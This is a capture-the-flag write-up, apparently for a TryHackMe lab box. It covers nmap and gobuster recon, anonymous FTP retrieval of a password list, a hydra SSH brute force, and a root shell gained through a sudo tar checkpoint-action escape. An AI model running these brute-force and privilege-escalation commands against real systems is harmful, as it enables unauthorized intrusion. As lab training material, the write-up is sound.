## Description

You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims!
Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future! 



## 1. Reconnaissance

```
nmap -sV 10.10.182.183
```


```
...Nmap scan report for 10.10.182.183
Host is up (1.7s latency).
Not shown: 968 filtered tcp ports (no-response), 29 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
...
```


As usual, we see that port 80 is open so we run gobuster on it


```
gobuster dir -url http://10.10.182.183 -w usr/share/wordlists/dirb/common.txt -t 100
```

-t is for number of threads to be checked together here it is 100


<img width="1259" alt="Screenshot 2023-08-13 at 12 13 47 PM" src="https://github.com/palSagnik/TryHackMe/assets/112897062/be79c483-2608-4e72-bc17-368c87588c56">


The result is /images and /index.html. After checking the source code and cookies on the website we do not find anything that can be helpful for us to get access
to the system.
Then we move on to the next service we found on the nmap scan that is ftp.



## 2. SSH?

ftp allows us to download files over the network.


```
ftp 10.10.182.183
```


Generally, in ftp there is a service known as anonymous which is pretty similar to being a guest user. In other terms we are logging as a guest user in that IP.


<img width="1251" alt="Screenshot 2023-08-13 at 12 13 16 PM" src="https://github.com/palSagnik/TryHackMe/assets/112897062/43352165-225f-4e35-b59c-9386769cd685">


When we try to list the contents of the current directory, we see the server going into EXTENDED PASSIVE MODE.
If you frequently encounter this, then type `passive` as the next command and press Enter. After that try ls and it should work.


<img width="1263" alt="Screenshot 2023-08-13 at 4 52 32 PM" src="https://github.com/palSagnik/TryHackMe/assets/112897062/6af8c65a-ba90-48ee-936d-3140bfe6a48d">


After this download the files present in the working directory, because that is what ftp is for.
The get command helps to download files over ftp.


<img width="1258" alt="Screenshot 2023-08-13 at 4 52 25 PM" src="https://github.com/palSagnik/TryHackMe/assets/112897062/35d851d3-a757-4979-a0d2-d31737292ef6">


locks.txt has the passwords of various kinds I guess? because these do not look anything else other than passwords.


```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

And task.txt output is something like

```   
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```


**NOTE**
Here I also checked if I could upload some file to the target through ftp, but it showed a permission denied error.

NO harm done, and it is always good to think about evry possible attack vectors.


Now we have passwords and also the user name, ie lin. Or maybe not lin, there is no harm in trying though, as we also know that ssh service is open.
We could bruteforce lin's password using hydra.


```
hydra -l lin -P locks.txt 10.10.182.183 ssh
```

Voila, 


<img width="1260" alt="Screenshot 2023-08-13 at 12 12 33 PM" src="https://github.com/palSagnik/TryHackMe/assets/112897062/e2cc4954-1610-4cf7-8559-5db7df66a748">


We now have the password for lin and all that is left now is to login.


<img width="1246" alt="Screenshot 2023-08-13 at 12 10 15 PM" src="https://github.com/palSagnik/TryHackMe/assets/112897062/90093544-47a2-4823-a79d-425d08356568">



## 3. Finishing it with root


Now I try to find SUID bit set on binaries, and do not come up with anything useful. Something related to sudo might help.
Only the common binaries have SUID bit set, this is noticed in all computers.


<img width="1262" alt="Screenshot 2023-08-13 at 7 02 54 PM" src="https://github.com/palSagnik/TryHackMe/assets/112897062/d24a2372-c241-420f-9feb-5a14cc4987c2">



```
sudo -l
```

This command lists the privileges the particular user is allowed to run.
These privileges are stored in the etc/sudoers file
This file helps to give certain privileged access to only a certain number of hosts.


<img width="1263" alt="Screenshot 2023-08-13 at 7 01 15 PM" src="https://github.com/palSagnik/TryHackMe/assets/112897062/4f995943-2b13-462f-a0ec-856d18ab28af">


Looking up tar on GTFO bins lands me with the code


```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```


And we have root access


<img width="1253" alt="Screenshot 2023-08-13 at 7 06 33 PM" src="https://github.com/palSagnik/TryHackMe/assets/112897062/c32148a5-0947-41d1-92a8-bfac59c35865">


The root.txt file was obviously in /root/root.txt.

And this box is over.
